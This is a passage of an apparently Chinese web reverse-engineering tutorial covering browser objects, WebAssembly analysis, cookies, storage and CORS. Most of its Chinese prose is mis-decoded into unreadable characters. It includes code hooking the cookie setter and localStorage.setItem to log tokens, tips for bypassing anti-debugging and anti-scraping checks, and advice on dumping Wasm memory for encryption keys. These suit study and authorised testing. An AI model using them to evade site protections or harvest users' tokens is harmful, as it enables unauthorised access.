      <h3 id="2-location-åœ°å€æ ">2. Location (åœ°å€æ )</h3>

      <p>ç®¡ç† URLã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span><span class="w"> </span><span class="c1">// å½“å‰å®Œæ•´ URL</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">;</span><span class="w"> </span><span class="c1">// æŸ¥è¯¢å‚æ•° (?id=1&amp;token=abc)</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">reload</span><span class="p">();</span><span class="w"> </span><span class="c1">// åˆ·æ–°é¡µé¢</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;https://google.com&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// è·³è½¬ä¸”ä¸ç•™å†å²è®°å½•</span>
</code></pre>
      </div>

      <h3 id="3-history-å†å²è®°å½•">3. History (å†å²è®°å½•)</h3>

      <p>å•é¡µåº”ç”¨ (SPA) å¸¸åˆ©ç”¨ History API å®ç°å‰ç«¯è·¯ç”±ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({},</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;/new-path&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// ä¿®æ”¹ URL ä½†ä¸åˆ·æ–°</span>
</code></pre>
      </div>

      <h3 id="4-screen-navigator-æŒ‡çº¹ä¸ç¯å¢ƒ">4. Screen &amp; Navigator (æŒ‡çº¹ä¸ç¯å¢ƒ)</h3>

      <ul>
        <li><code>screen.width</code> / <code>screen.height</code>: å±å¹•åˆ†è¾¨ç‡ã€‚</li>
        <li><code>navigator.userAgent</code>: ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²ã€‚</li>
      </ul>

      <h4 id="reverse-engineering-context-åè°ƒè¯•æ£€æµ‹">[Reverse Engineering Context] åè°ƒè¯•æ£€æµ‹</h4>

      <p>å¾ˆå¤šç«™ç‚¹ä¼šæ£€æµ‹ BOM å±æ€§æ¥åˆ¤æ–­æ˜¯å¦å¤„äºè°ƒè¯•æ¨¡å¼ã€‚</p>

      <ol>
        <li>
          <p><strong>æ£€æµ‹çª—å£å¤§å°</strong>: å¼€å‘è€…å·¥å…·æ‰“å¼€æ—¶ï¼Œç½‘é¡µå¯è§†åŒºåŸŸ (<code>window.innerWidth</code> / <code>innerHeight</code>) ä¼šå˜å°ã€‚
          </p>

          <div class="codehilite">
            <pre><span></span><code><span class="nx">setInterval</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">outerWidth</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">innerWidth</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">160</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;DevTools opened!&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>æ£€æµ‹ Console</strong>: é‡å†™ <code>console.log</code> æˆ–åˆ©ç”¨ <code>console.table</code> ç­‰æ–¹æ³•çš„ç‰¹æ®Šè¡Œä¸ºã€‚</p>
        </li>
        <li>
          <p><strong>debugger è¯­å¥</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="nx">setInterval</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">debugger</span><span class="p">;</span><span class="w"> </span><span class="c1">// å¦‚æœå¼€å¯äº† DevToolsï¼Œä¼šæ— é™æ–­ç‚¹å¡ä½é¡µé¢</span>
<span class="p">},</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
</code></pre>
          </div>

          <ul>
            <li><strong>å¯¹æŠ—</strong>:
              <ul>
                <li>&#8220;Never pause here&#8221; (DevTools å³é”®æ–­ç‚¹è¡Œ)ã€‚</li>
                <li>Hook <code>Function.prototype.constructor</code> (å¦‚æœæ˜¯ <code>Function("debugger")()</code> è¿™ç§å½¢å¼)ã€‚
                </li>
                <li>æœ¬åœ°æ›¿æ¢ (Local Override) åˆ é™¤ <code>debugger</code> è¯­å¥ã€‚</li>
              </ul>
            </li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <ul>
        <li><strong>DOM</strong> æ˜¯å†…å®¹çš„è½½ä½“ï¼Œ<strong>é€†å‘æ ¸å¿ƒ</strong>æ˜¯åˆ©ç”¨ DOM æ–­ç‚¹å’Œäº‹ä»¶ç›‘å¬å™¨æ–­ç‚¹å¿«é€Ÿå®šä½ä¸šåŠ¡é€»è¾‘å…¥å£ã€‚</li>
        <li><strong>BOM</strong> æ˜¯ç¯å¢ƒçš„æ¥å£ï¼Œ<strong>é€†å‘æ ¸å¿ƒ</strong>æ˜¯è¯†åˆ«å’Œç»•è¿‡åŸºäºæµè§ˆå™¨ç¯å¢ƒç‰¹å¾çš„åè°ƒè¯•/åçˆ¬è™«æ£€æµ‹ã€‚</li>
      </ul>

    </div>

    <div class="section" id="01-Foundations-webassembly-basics">
      <h2>10. WebAssembly Basics</h2>
      <h1 id="webassembly-åŸºç¡€">WebAssembly åŸºç¡€</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>WebAssembly (Wasm) æ˜¯ä¸€ç§äºŒè¿›åˆ¶æŒ‡ä»¤æ ¼å¼ï¼Œå…è®¸åœ¨ Web ä¸Šè¿è¡Œé«˜æ€§èƒ½ä»£ç ï¼ˆå¦‚ C/C++/Rust ç¼–è¯‘è€Œæ¥ï¼‰ã€‚éšç€è¶Šæ¥è¶Šå¤šçš„æ ¸å¿ƒç®—æ³•ï¼ˆåŠ å¯†ã€è§£ç ã€å¤æ‚é€»è¾‘ï¼‰è¢«è¿ç§»åˆ° Wasmï¼Œé€†å‘ Wasm
        å·²æˆä¸ºç°ä»£ Web é€†å‘çš„å¿…å¤‡æŠ€èƒ½ã€‚</p>

      <hr />

      <h2 id="wasm-æ˜¯ä»€ä¹ˆ">Wasm æ˜¯ä»€ä¹ˆï¼Ÿ</h2>

      <h3 id="1-æ ¸å¿ƒç‰¹æ€§">1. æ ¸å¿ƒç‰¹æ€§</h3>

      <ul>
        <li><strong>äºŒè¿›åˆ¶æ ¼å¼ (<code>.wasm</code>)</strong>: ç´§å‡‘ï¼ŒåŠ è½½å¿«ï¼Œä½†ä¸å¯è¯»ã€‚</li>
        <li><strong>æ–‡æœ¬æ ¼å¼ (<code>.wat</code>)</strong>: Wasm çš„æ±‡ç¼–å½¢å¼ï¼ŒS-expression é£æ ¼ï¼Œå¯è¯»æ€§å°šå¯ã€‚</li>
        <li><strong>çº¿æ€§å†…å­˜ (Linear Memory)</strong>: Wasm åªèƒ½è®¿é—®ä¸€å—è¿ç»­çš„ ArrayBufferï¼Œé€šè¿‡ä¸‹æ ‡è¯»å†™ã€‚</li>
        <li><strong>æ ˆå¼è™šæ‹Ÿæœº</strong>: æŒ‡ä»¤åŸºäºæ“ä½œæ•°æ ˆï¼Œä¾‹å¦‚ <code>i32.add</code> ä¼šä»æ ˆé¡¶å¼¹å‡ºä¸¤ä¸ªæ•°ï¼Œç›¸åŠ åç»“æœå‹æ ˆã€‚</li>
      </ul>

      <h3 id="2-js-ä¸-wasm-äº’æ“ä½œ">2. JS ä¸ Wasm äº’æ“ä½œ</h3>

      <p>Wasm æ¨¡å—éœ€è¦ JS æ¥åŠ è½½å’Œå®ä¾‹åŒ–ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¿™é‡Œå¯ä»¥ Hook !</span>
<span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">instantiate</span><span class="p">(</span><span class="nx">buffer</span><span class="p">,</span><span class="w"> </span><span class="nx">imports</span><span class="p">).</span><span class="nx">then</span><span class="p">((</span><span class="nx">results</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="c1">// results.instance.exports åŒ…å« Wasm å¯¼å‡ºçš„å‡½æ•°</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="wasm-é€†å‘æµç¨‹">Wasm é€†å‘æµç¨‹</h2>

      <h3 id="1-è·å–-wasm-æ–‡ä»¶">1. è·å– Wasm æ–‡ä»¶</h3>

      <p>é€šå¸¸åœ¨ Network é¢æ¿å¯ä»¥çœ‹åˆ° <code>.wasm</code> æ–‡ä»¶çš„è¯·æ±‚ã€‚</p>

      <ul>
        <li>_æ³¨æ„_: æœ‰äº›ç«™ç‚¹ä¼šå°† Wasm äºŒè¿›åˆ¶æ•°æ®ç¡¬ç¼–ç åœ¨ JS å­—ç¬¦ä¸²æˆ– ArrayBuffer ä¸­ï¼Œç„¶ååŠ¨æ€åŠ è½½ã€‚å¯ä»¥é€šè¿‡ Hook <code>WebAssembly.instantiate</code> æ¥æ•è·
          bufferã€‚</li>
      </ul>

      <h3 id="2-é™æ€åˆ†æ-disassembly-decompilation">2. é™æ€åˆ†æ (Disassembly / Decompilation)</h3>

      <p>æ‹¿åˆ° <code>.wasm</code> æ–‡ä»¶åï¼Œéœ€è¦å°†å…¶è¿˜åŸä¸ºå¯è¯»ä»£ç ã€‚</p>

      <ul>
        <li>
          <p><strong>wasm2wat (WABT å·¥å…·åŒ…)</strong>: è½¬æ¢ä¸º <code>.wat</code> æ±‡ç¼–ã€‚</p>

          <div class="codehilite">
            <pre><span></span><code><span class="p">(</span><span class="nv">func</span><span class="w"> </span><span class="nv">$add</span><span class="w"> </span><span class="p">(</span><span class="nv">param</span><span class="w"> </span><span class="nv">$p0</span><span class="w"> </span><span class="nv">i32</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nv">param</span><span class="w"> </span><span class="nv">$p1</span><span class="w"> </span><span class="nv">i32</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nv">result</span><span class="w"> </span><span class="nv">i32</span><span class="p">)</span>
<span class="w">  </span><span class="nv">local.get</span><span class="w"> </span><span class="nv">$p0</span>
<span class="w">  </span><span class="nv">local.get</span><span class="w"> </span><span class="nv">$p1</span>
<span class="w">  </span><span class="nv">i32.add</span><span class="p">)</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>Decompilers (åç¼–è¯‘å™¨)</strong>: å°è¯•è¿˜åŸä¸ºç±» C ä»£ç ï¼ˆä¼ªä»£ç ï¼‰ã€‚</p>

          <ul>
            <li><strong>JEB Decompiler</strong>: å•†ä¸šè½¯ä»¶ï¼Œåç¼–è¯‘æ•ˆæœè¾ƒå¥½ã€‚</li>
            <li><strong>Ghidra</strong>: éœ€è¦å®‰è£… Wasm æ’ä»¶ã€‚</li>
            <li><strong>wasm-decompile</strong>: WABT è‡ªå¸¦ï¼Œè¾“å‡ºç±»ä¼¼ C çš„ä¼ªä»£ç ã€‚</li>
          </ul>
        </li>
      </ul>

      <h3 id="3-åŠ¨æ€è°ƒè¯•">3. åŠ¨æ€è°ƒè¯•</h3>

      <p>Chrome DevTools å·²ç»å¾ˆå¥½åœ°æ”¯æŒ Wasm è°ƒè¯•ã€‚</p>

      <ol>
        <li>Sources é¢æ¿ -> æ‰¾åˆ° <code>wasm</code> æ–‡ä»¶ï¼ˆé€šå¸¸åœ¨ <code>wasm://</code> åè®®ä¸‹ï¼‰ã€‚</li>
        <li>ç‚¹å‡»ä»£ç è¡Œå·ä¸‹æ–­ç‚¹ã€‚</li>
        <li>å•æ­¥è°ƒè¯•ï¼Œè§‚å¯Ÿ Stackï¼ˆæ ˆï¼‰å’Œ Memoryï¼ˆå†…å­˜ï¼‰çš„å˜åŒ–ã€‚</li>
      </ol>

      <hr />

      <h2 id="å…³é”®é€†å‘æŠ€å·§">å…³é”®é€†å‘æŠ€å·§</h2>

      <h3 id="1-å¯»æ‰¾å¯¼å‡ºå‡½æ•°-exports">1. å¯»æ‰¾å¯¼å‡ºå‡½æ•° (Exports)</h3>

      <p>Wasm æ¨¡å—é€šå¸¸ä¼šå¯¼å‡ºä¸€ä¸ªå…¥å£å‡½æ•°ç»™ JS è°ƒç”¨ï¼ˆå¦‚ <code>encrypt</code>, <code>hash</code>ï¼‰ã€‚è¿™æ˜¯æˆ‘ä»¬åˆ†æçš„èµ·ç‚¹ã€‚</p>

      <h3 id="2-åˆ†æå¯¼å…¥å‡½æ•°-imports">2. åˆ†æå¯¼å…¥å‡½æ•° (Imports)</h3>

      <p>Wasm ç»å¸¸éœ€è¦è°ƒç”¨ JS å‡½æ•°ï¼ˆå› ä¸º Wasm ä¸èƒ½ç›´æ¥æ“ä½œ DOM æˆ–å‘é€ç½‘ç»œè¯·æ±‚ï¼‰ã€‚</p>

      <ul>
        <li>æŸ¥çœ‹ Imports åˆ—è¡¨ï¼Œå¦‚æœå‘ç°å¯¼å…¥äº† <code>console.log</code> æˆ–è€…ç½‘ç»œç›¸å…³çš„ JS å‡½æ•°ï¼Œå¯ä»¥åœ¨è¿™äº› JS å‡½æ•°ä¸Š Hookï¼Œä»è€Œçª¥æ¢ Wasm å†…éƒ¨çŠ¶æ€ã€‚</li>
      </ul>

      <h3 id="3-å†…å­˜è§†å›¾">3. å†…å­˜è§†å›¾</h3>

      <p>Wasm çš„å†…å­˜æ˜¯ä¸€ä¸ª <code>WebAssembly.Memory</code> å¯¹è±¡ï¼Œæœ¬è´¨ä¸Šæ˜¯ JS çš„ <code>ArrayBuffer</code>ã€‚</p>

      <ul>
        <li>
          <p>ä»»ä½•æ—¶å€™ï¼Œä½ éƒ½å¯ä»¥é€šè¿‡ JS è¯»å–è¿™å—å†…å­˜ï¼š</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">mem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">memory</span><span class="p">;</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">mem</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">view</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">100</span><span class="p">));</span><span class="w"> </span><span class="c1">// æŸ¥çœ‹å‰100å­—èŠ‚</span>
</code></pre>
          </div>
        </li>
        <li>
          <p>å¦‚æœ Wasm åœ¨è¿›è¡ŒåŠ å¯†æ“ä½œï¼Œå¯†é’¥å¾€å¾€å°±åœ¨è¿™å—å†…å­˜é‡Œã€‚</p>
        </li>
      </ul>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>Wasm é€†å‘ = <strong>äºŒè¿›åˆ¶åˆ†æ</strong> (IDA/Ghidra) + <strong>Web åŠ¨æ€è°ƒè¯•</strong> (DevTools)ã€‚è™½ç„¶é—¨æ§›æ¯”çº¯ JS é€†å‘é«˜ï¼Œä½†æ ¸å¿ƒé€»è¾‘ä¾ç„¶æ˜¯ï¼šè¾“å…¥
        -> [é»‘ç›’å¤„ç†] -> è¾“å‡ºã€‚åªè¦èƒ½æ§åˆ¶è¾“å…¥è¾“å‡ºï¼Œå¹¶æœ‰èƒ½åŠ›çª¥æ¢é»‘ç›’å†…éƒ¨ï¼ˆHook Imports, Dump Memoryï¼‰ï¼Œå°±èƒ½æ”»å…‹ã€‚</p>

    </div>

    <div class="section" id="01-Foundations-cookie-and-storage">
      <h2>11. Cookie And Storage</h2>
      <h1 id="cookie-ä¸-storage">Cookie ä¸ Storage</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>Web åº”ç”¨éœ€è¦åœ¨å®¢æˆ·ç«¯å­˜å‚¨æ•°æ®ï¼Œç”¨äºç»´æŒä¼šè¯çŠ¶æ€ï¼ˆSessionï¼‰ã€ä¿å­˜ç”¨æˆ·åå¥½æˆ–ç¼“å­˜æ•°æ®ã€‚åœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œè¿™äº›å­˜å‚¨ä½ç½®å¾€å¾€æ˜¯å¯»æ‰¾ Tokenã€å¯†é’¥æˆ–æ•æ„Ÿä¿¡æ¯çš„é¦–é€‰ä¹‹åœ°ã€‚</p>

      <hr />

      <h2 id="cookie">Cookie</h2>

      <p>Cookie æ˜¯æœ€æ—©çš„å®¢æˆ·ç«¯å­˜å‚¨æœºåˆ¶ï¼Œä¸»è¦ç”¨äº HTTP çŠ¶æ€ç®¡ç†ã€‚</p>

      <h3 id="1-ç»“æ„ä¸å±æ€§">1. ç»“æ„ä¸å±æ€§</h3>

      <p>ä¸€ä¸ª Cookie åŒ…å«ä»¥ä¸‹å…³é”®å±æ€§ï¼š</p>

      <ul>
        <li><strong>Name/Value</strong>: é”®å€¼å¯¹ã€‚</li>
        <li><strong>Domain/Path</strong>: ä½œç”¨åŸŸã€‚</li>
        <li><strong>Expires/Max-Age</strong>: æœ‰æ•ˆæœŸã€‚</li>
        <li><strong>HttpOnly</strong>: <strong>å…³é”®å±æ€§</strong>ã€‚å¦‚æœè®¾ç½®ä¸º <code>true</code>ï¼ŒJS
          æ— æ³•è¯»å–ï¼ˆ<code>document.cookie</code> è¯»ä¸åˆ°ï¼‰ï¼Œä½†è¿™ä¸å½±å“æŠ“åŒ…ã€‚è¿™ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢ XSS æ”»å‡»çªƒå– Cookieã€‚</li>
        <li><strong>Secure</strong>: ä»…é€šè¿‡ HTTPS ä¼ è¾“ã€‚</li>
        <li><strong>SameSite</strong>: <code>Strict</code> / <code>Lax</code> / <code>None</code>ï¼Œé™åˆ¶è·¨ç«™è¯·æ±‚æºå¸¦ Cookieï¼ˆé˜²æ­¢
          CSRFï¼‰ã€‚</li>
      </ul>

      <h3 id="2-reverse-engineering-context-cookie-é€†å‘">2. [Reverse Engineering Context] Cookie é€†å‘</h3>

      <ul>
        <li>
          <p><strong>Hook Setter</strong>: å¦‚å‰æ–‡æ‰€è¿°ï¼ŒHook <code>document.cookie</code> çš„ setter å¯ä»¥å®šä½ JS æ˜¯åœ¨å“ªé‡Œç”Ÿæˆ/è®¾ç½® Cookie çš„ã€‚
          </p>

          <div class="codehilite">
            <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">cookie_cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">cookie_cache</span><span class="p">;</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">val</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;Setting cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">val</span><span class="p">);</span>
<span class="w">    </span><span class="nx">cookie_cache</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">val</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">val</span><span class="p">;</span>
<span class="w">  </span><span class="p">},</span>
<span class="p">});</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>HttpOnly Bypass?</strong>: å¦‚æœ Cookie æ˜¯ HttpOnly çš„ï¼Œä½ æ— æ³•é€šè¿‡ JS Hook æ‹¿åˆ°ï¼ˆå› ä¸ºæµè§ˆå™¨å†…æ ¸é˜»æ­¢äº†ï¼‰ã€‚ä½†ä½ å¯ä»¥ï¼š</p>

          <ol>
            <li>æŠ“åŒ…ï¼ˆBurp/Fiddler/Network Panelï¼‰ã€‚</li>
            <li>å¦‚æœæ˜¯ Electron åº”ç”¨ï¼Œå¯ä»¥å°è¯•è°ƒè¯•ä¸»è¿›ç¨‹æˆ–ä½¿ç”¨ Protocol Monitorã€‚</li>
          </ol>
        </li>
      </ul>

      <hr />

      <h2 id="web-storage-local-session">Web Storage (Local / Session)</h2>

      <p>HTML5 å¼•å…¥çš„é”®å€¼å¯¹å­˜å‚¨ï¼Œæ¯” Cookie æ›´å¤§ï¼ˆ~5MBï¼‰ï¼Œæ¥å£æ›´ç®€å•ã€‚</p>

      <h3 id="1-localstorage-vs-sessionstorage">1. LocalStorage vs SessionStorage</h3>

      <ul>
        <li><strong>LocalStorage</strong>: æŒä¹…åŒ–å­˜å‚¨ï¼Œé™¤éä¸»åŠ¨åˆ é™¤ï¼Œå¦åˆ™ä¸€ç›´å­˜åœ¨ã€‚</li>
        <li><strong>SessionStorage</strong>: ä¼šè¯çº§å­˜å‚¨ï¼Œå…³é—­æ ‡ç­¾é¡µåæ¶ˆå¤±ã€‚</li>
      </ul>

      <h3 id="2-api">2. API</h3>

      <ul>
        <li><code>getItem(key)</code></li>
        <li><code>setItem(key, value)</code></li>
        <li><code>removeItem(key)</code></li>
        <li><code>clear()</code></li>
      </ul>

      <h3 id="3-reverse-engineering-context-ç›‘æ§å­˜å‚¨">3. [Reverse Engineering Context] ç›‘æ§å­˜å‚¨</h3>

      <p>å¾ˆå¤š JWT (JSON Web Token) å­˜å‚¨åœ¨ LocalStorage ä¸­ã€‚</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç®€å•çš„ Hook ç›‘æ§ setItem</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">;</span>
<span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">(</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">key</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;token&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[LocalStorage] Token detected:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">originalSetItem</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>å®æˆ˜æŠ€å·§</strong>: åœ¨ DevTools çš„ Application é¢æ¿å¯ä»¥ç›´æ¥æŸ¥çœ‹å’Œç¼–è¾‘ Storage æ•°æ®ã€‚</p>

      <hr />

      <h2 id="indexeddb">IndexedDB</h2>

      <p>æµè§ˆå™¨å†…ç½®çš„éå…³ç³»å‹æ•°æ®åº“ï¼Œç”¨äºå­˜å‚¨å¤§é‡ç»“æ„åŒ–æ•°æ®ã€‚</p>

      <h3 id="1-ç‰¹ç‚¹">1. ç‰¹ç‚¹</h3>

      <ul>
        <li>æ”¯æŒäº‹åŠ¡ã€‚</li>
        <li>æ”¯æŒç´¢å¼•ã€‚</li>
        <li>å¼‚æ­¥ APIã€‚</li>
      </ul>

      <h3 id="2-é€†å‘åœºæ™¯">2. é€†å‘åœºæ™¯</h3>

      <p>è¾ƒå°‘ç”¨äºå­˜å‚¨ç®€å•çš„ Tokenï¼Œä½†åœ¨å¤æ‚çš„ Web Appï¼ˆå¦‚åœ¨çº¿æ–‡æ¡£ã€å³æ—¶é€šè®¯ã€ç¦»çº¿åº”ç”¨ï¼‰ä¸­ï¼Œå¯èƒ½ä¼šç¼“å­˜å¤§é‡çš„ä¸šåŠ¡æ•°æ®ç”šè‡³ä»£ç é€»è¾‘ã€‚å¦‚æœå‘ç°åº”ç”¨åœ¨ Application é¢æ¿çš„ IndexedDB
        é‡Œå­˜äº†å¾ˆå¤šæ•°æ®ï¼Œå€¼å¾—çœ‹ä¸€çœ¼ã€‚</p>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <table>
        <thead>
          <tr>
            <th style="text-align:left;">å­˜å‚¨ç±»å‹</th>
            <th style="text-align:left;">å®¹é‡</th>
            <th style="text-align:left;">ç”Ÿå‘½å‘¨æœŸ</th>
            <th style="text-align:left;">JS å¯è®¿é—®æ€§</th>
            <th style="text-align:left;">é€†å‘å…³æ³¨ç‚¹</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="text-align:left;"><strong>Cookie</strong></td>
            <td style="text-align:left;">4KB</td>
            <td style="text-align:left;">å¯è®¾ / ä¼šè¯</td>
            <td style="text-align:left;">å–å†³äº HttpOnly</td>
            <td style="text-align:left;">Session ID, ç­¾åå‚æ•°</td>
          </tr>
          <tr>
            <td style="text-align:left;"><strong>LocalStorage</strong></td>
            <td style="text-align:left;">5MB</td>
            <td style="text-align:left;">æ°¸ä¹…</td>
            <td style="text-align:left;">æ˜¯</td>
            <td style="text-align:left;">JWT Token, ç”¨æˆ·é…ç½®</td>
          </tr>
          <tr>
            <td style="text-align:left;"><strong>SessionStorage</strong></td>
            <td style="text-align:left;">5MB</td>
            <td style="text-align:left;">Tab å…³é—­</td>
            <td style="text-align:left;">æ˜¯</td>
            <td style="text-align:left;">ä¸´æ—¶çŠ¶æ€</td>
          </tr>
          <tr>
            <td style="text-align:left;"><strong>IndexedDB</strong></td>
            <td style="text-align:left;">æ— é™</td>
            <td style="text-align:left;">æ°¸ä¹…</td>
            <td style="text-align:left;">æ˜¯</td>
            <td style="text-align:left;">å¤§é‡ä¸šåŠ¡æ•°æ®</td>
          </tr>
        </tbody>
      </table>

      <p><strong>é€†å‘ç¬¬ä¸€æ­¥</strong>: F12 -> Application é¢æ¿ï¼ŒæŠŠè¿™å‡ ä¸ªåœ°æ–¹ç¿»ä¸€éï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åä¸º <code>token</code>, <code>auth</code>,
        <code>sign</code>, <code>key</code> çš„å¯ç–‘å­—æ®µã€‚</p>

    </div>

    <div class="section" id="01-Foundations-cors-and-same-origin-policy">
      <h2>12. CORS And Same Origin Policy</h2>
      <h1 id="cors-ä¸åŒæºç­–ç•¥">CORS ä¸åŒæºç­–ç•¥</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>åŒæºç­–ç•¥ (Same-Origin Policy, SOP) æ˜¯æµè§ˆå™¨æœ€æ ¸å¿ƒçš„å®‰å…¨æœºåˆ¶ï¼Œè€Œ CORS (Cross-Origin Resource Sharing) æ˜¯ SOP çš„å„ç§ &#8220;ä¾‹å¤–&#8221;
        ä¹‹ä¸€ã€‚ç†è§£å®ƒä»¬å¯¹äºè°ƒè¯• API è¯·æ±‚å¤±è´¥ã€è·¨åŸŸæ³¨å…¥æ”»å‡»ä»¥åŠæœ¬åœ°æ­å»ºæµ‹è¯•ç¯å¢ƒè‡³å…³é‡è¦ã€‚</p>

      <hr />

      <h2 id="åŒæºç­–ç•¥-sop">åŒæºç­–ç•¥ (SOP)</h2>

      <h3 id="1-å®šä¹‰">1. å®šä¹‰</h3>

      <p>ä¸¤ä¸ª URL è¯´å®ƒä»¬æ˜¯â€œåŒæºâ€çš„ï¼Œå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶å®Œå…¨ç›¸åŒï¼š</p>

      <ol>
        <li><strong>åè®® (Protocol)</strong>: éƒ½æ˜¯ <code>http</code> æˆ–éƒ½æ˜¯ <code>https</code>ã€‚</li>
        <li><strong>åŸŸå (Domain)</strong>: å¦‚ <code>www.example.com</code>ã€‚</li>
        <li><strong>ç«¯å£ (Port)</strong>: å¦‚ <code>80</code>, <code>443</code>ã€‚</li>
      </ol>

      <p>å¦‚æœä¸åŒæºï¼Œæµè§ˆå™¨ä¼šé™åˆ¶ï¼š</p>

      <ul>
        <li><strong>Cookie, LocalStorage, IndexedDB</strong> è¯»å–ã€‚</li>
        <li><strong>DOM</strong> è®¿é—® (å¦‚ iframe)ã€‚</li>
